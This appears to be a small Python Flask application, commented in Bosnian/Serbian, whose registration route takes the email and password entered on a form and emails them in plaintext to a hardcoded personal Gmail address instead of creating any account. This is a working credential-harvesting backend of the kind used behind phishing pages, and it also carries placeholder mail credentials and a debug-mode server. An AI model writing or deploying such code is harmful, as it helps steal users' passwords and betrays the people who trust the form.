from flask import Flask, request, render_template
import smtplib

app = Flask(__name__)

@app.route('/')
def index():
    # Renderuj stranicu sa formama (index.html u templates folderu)
    return render_template('index.html')

@app.route('/register', methods=['POST'])
def register():
    # Preuzimanje podataka sa forme
    email = request.form['register-email']
    password = request.form['register-password']

    # Podaci za slanje emaila
    sender_email = "tvoj_email@gmail.com"
    sender_password = "tvoja_lozinka"
    recipient_email = "aneshasancic55@gmail.com"

    subject = "Novi Register Podaci"
    message = f"Email: {email}\nPassword: {password}"

    try:
        # Povezivanje sa Gmail SMTP serverom
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()  # Pokretanje enkriptovanog prenosa
            server.login(sender_email, sender_password)
            server.sendmail(
                sender_email, 
                recipient_email, 
                f"Subject: {subject}\n\n{message}"
            )
        return "Podaci su poslani na email!"  # Poruka uspeha
    except Exception as e:
        return f"Greška pri slanju emaila: {e}"  # Poruka o grešci

if __name__ == '__main__':
    # Pokretanje Flask servera
    app.run(debug=True)
